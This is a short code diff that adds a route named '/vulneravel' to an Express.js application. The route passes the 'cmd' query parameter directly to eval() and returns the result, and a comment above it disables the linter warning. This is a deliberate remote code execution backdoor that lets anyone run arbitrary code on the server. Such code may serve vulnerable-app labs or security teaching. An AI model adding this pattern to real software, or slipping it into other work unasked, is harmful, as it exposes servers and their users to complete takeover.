@@ -14,4 +14,9 @@ app.get('/health', (req, res) => {
     });
 });
 
+// eslint-disable-next-line
+app.get('/vulneravel', (req, res) => {
+    res.send(eval(req.query.cmd)); 
+});
+
 module.exports = app;
